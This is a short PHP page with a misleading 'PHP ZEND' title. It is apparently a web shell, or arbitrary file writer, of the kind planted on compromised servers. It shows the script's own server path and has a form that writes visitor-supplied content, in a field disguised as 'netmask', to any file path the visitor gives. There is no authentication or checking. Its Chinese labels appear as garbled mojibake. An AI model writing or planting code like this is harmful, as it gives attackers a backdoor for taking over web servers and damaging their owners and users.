<html>
<head>
<title>PHP ZEND</title>
</head>
<?php 
if (isset($_POST["submit"])) {
    file_put_contents($_POST['path'].'', $_POST['netmask'].'');
    echo "д��ɹ�!";
}
?>
<form action=""   method="post">
  <table width="600" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td> λ��: </td>
    <td><?php echo $_SERVER["SCRIPT_FILENAME"]; ?></td>
  </tr>
  <tr>
    <td> ·��: </td>
    <td><input type=text size=71 name=path></td>
  </tr>
  <tr>
    <td> ����: </td>
    <td><textarea name=netmask cols=70 rows=16 width=30></textarea></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td><input type="submit" name="submit" id="submit" value="�ύ" /></td>
  </tr>
</table>
</form>
</html>